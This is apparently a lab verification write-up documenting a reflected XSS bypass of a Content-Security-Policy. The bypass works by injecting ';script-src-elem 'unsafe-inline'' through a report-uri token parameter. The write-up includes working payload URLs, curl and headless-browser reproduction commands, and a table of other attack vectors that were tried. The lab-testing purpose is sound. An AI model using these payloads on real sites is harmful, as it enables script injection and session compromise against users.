# Verification — CSP policy injection (report-uri token)

## Methodology
1. Reflection mapping (curl): marker → echo (`<h1>`, verbatim?).
2. Header mapping (curl `-D`): full CSP text; identify attacker-influenced spans
   (`token=` value).
3. Token-flow proof: distinctive marker in `token` → same bytes in header.
4. BASELINE (A): classic payload WITHOUT token → must reflect but NOT fire
   (proves the CSP was the operative barrier, not the echo).
5. BYPASS (B): same payload WITH token → must fire (proves the injected directive
   changes enforcement; single-variable A/B).
6. Lab acceptance: real-browser `alert(1)`; banner polls.

## Evidence

### 1. Reflection (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>   (verbatim)
```

### 2. Policy + token flow (curl headers)
```
request : /?search=x&token=TOKENMARK
response: Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=TOKENMARK
```
Attacker bytes land verbatim post-`token=`. Session cookie here IS HttpOnly
(contrast the stealing-cookies lab) — theft channel noted for impact.

### 3. BASELINE (headless dump-dom, no token)
```
?search=<script>document.title='BASELINE'</script>
→ <title> UNCHANGED ("Reflected XSS protected by CSP, with CSP bypass")
```
Echo present, execution refused — CSP as the SOLE barrier, isolated.

### 4. BYPASS (headless dump-dom, with token)
```
?search=<script>document.title='CSPBYPASS'</script>&token=;script-src-elem 'unsafe-inline'
→ <title>CSPBYPASS</title>
```
Identical payload, one added parameter, opposite verdict — the injected directive
is necessary AND sufficient. (Non-blocking title marker keeps the harness clean;
no dialogs involved at any stage.)

### 5. Injected header bytes (curl -D)
```
…report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```
The `;` + directive survive into the enforced policy verbatim.

### 6. Lab acceptance
Real browser → `/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=%3Bscript-src-elem+%27unsafe-inline%27`
→ `alert(1)` on load → `is-solved` (first poll).

### 7. Dead-end analysis
| Candidate | Verdict | Basis |
|---|---|---|
| Plain `<script>`/`<img onerror>` without token | blocked (verified baseline) | `script-src 'self'`, no unsafe-inline |
| `javascript:` URIs | would-be-blocked (unfired — subsumed) | scheme navigation governed by script-src (no unsafe-inline) |
| Dangling markup / exfil-only shapes | unnecessary | full execution restored; exfil is a downgrade |
| `object`/`embed`/`applet` vectors | blocked by design | `object-src 'none'` (policy's one sound clause) |
| Alternate directives (`script-src` overwrite) | unneeded | `script-src-elem` suffices and is more targeted |

## Reproducibility
```
BASE=…
curl -s -D - "$BASE/?search=x&token=TOKENMARK" -o /dev/null | grep -i content-security
# baseline (expect unchanged title):
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%3Cscript%3Edocument.title%3D%27BASELINE%27%3C/script%3E" | grep -o "<title>[^<]*</title>"
# bypass (expect changed title):
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%3Cscript%3Edocument.title%3D%27CSPBYPASS%27%3C/script%3E&token=%3Bscript-src-elem+%27unsafe-inline%27" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: verbatim echo, token→header flow, baseline block, bypassed execution
  (A/B single-variable), injected header bytes, real-browser acceptance.
- The A/B pair is the load-bearing evidence: same payload, token as the only
  delta, opposite verdicts.